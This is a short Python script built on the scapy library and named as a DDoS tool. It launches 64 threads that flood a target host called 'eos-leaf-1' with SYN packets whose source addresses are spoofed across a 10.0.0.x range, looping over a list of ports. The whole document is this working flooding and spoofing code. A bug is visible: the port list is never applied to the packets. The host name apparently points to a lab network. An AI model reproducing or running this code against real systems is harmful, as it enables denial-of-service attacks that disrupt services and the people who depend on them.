from scapy.all import *
from threading import Thread
import time

def sendPackets(victimAddress,victimPort):
	for i in range(1,254):
		for port in victimPort:
			packetSYN = IP(dst=victimAddress,src="10.0.0." + str(i))/TCP(flags="S")
			send(packetSYN)
			print("victim sees 10.0.0." + str(i))


def startDDOS(victimAddress,victimPort,numThreads):
	for i in range(1,numThreads):
		thread = Thread(target=sendPackets,args=(victimAddress,victimPort))
		thread.start()

ports = ["22","80","8080","3333","1234"]
startDDOS("eos-leaf-1",ports,64)
